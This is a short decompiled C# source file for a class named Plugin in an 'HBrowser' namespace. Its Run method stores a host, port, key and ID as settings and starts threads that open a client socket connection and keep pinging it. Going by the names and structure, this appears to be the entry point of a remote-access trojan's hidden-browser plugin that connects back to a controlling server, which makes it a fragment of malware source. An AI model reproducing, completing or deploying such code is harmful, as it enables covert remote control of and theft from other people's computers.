using System;
using System.Diagnostics;
using System.Threading;

namespace HBrowser
{
	// Token: 0x02000006 RID: 6
	internal class Plugin
	{
		// Token: 0x06000023 RID: 35 RVA: 0x00003108 File Offset: 0x00001308
		public static void Run(string H, string P, string SL, string K, string id)
		{
			try
			{
				Settings.Host = H;
				Settings.Port = P;
				Settings.SPL = SL;
				Settings.KEY = K;
				Settings.IDD = id;
				Plugin.T1.Start();
				Plugin.T2.Start();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x04000007 RID: 7
		public static Thread T1 = new Thread(new ThreadStart(ClientSocket.BeginConnect));

		// Token: 0x04000008 RID: 8
		public static Thread T2 = new Thread(new ThreadStart(ClientSocket.Ping));
	}
}
